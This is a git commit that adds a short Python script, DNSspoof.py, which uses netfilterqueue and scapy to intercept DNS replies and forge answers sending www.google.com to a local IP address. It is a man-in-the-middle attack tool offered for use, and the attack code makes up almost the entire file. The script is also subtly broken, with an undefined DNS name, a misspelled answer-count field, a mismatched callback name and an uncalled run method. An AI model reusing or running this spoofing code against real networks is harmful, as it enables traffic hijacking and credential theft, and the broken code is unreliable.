c18db89258e21aaf1d7a547f2a29cea5bdcd88d7
Tony Nguyen <69164218+Tnguye98@users.noreply.github.com>
2022-07-28 14:07:19 -0400

    Create DNSspoof.py
    Able to run on Python3.

---
+++ Python/DNSspoof.py
@@ -0,0 +1,61 @@
+#!/usr/bin/env python3
+import netfilterqueue
+import scapy.all as scapy
+
+
+def processPacket(packet):
+	scapyPacket = scapy.IP(packet.get_payload())
+	if scapyPacket.haslayer(scapy.DNSRR):
+		qname = scapyPacket[scapy.DNSQR].qname
+		if "www.google.com" in str(qname):
+			print("[+] Spoofing target")	
+			answer = scapy.DNSRR(rrname = qname, rdata = "10.211.55.15")
+			scapyPacket[DNS].an = answer
+			scapyPacket[DNS].account = 1
+
+			del scapyPacket[scapy.IP].len
+			del scapyPacket[scapy.IP].chksum
+			del scapyPacket[scapy.UDP].len
+			del scapyPacket[scapy.UDP].chksum
+
+			packet.set_payload(bytes(scapyPacket))
+
+	packet.accept()
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
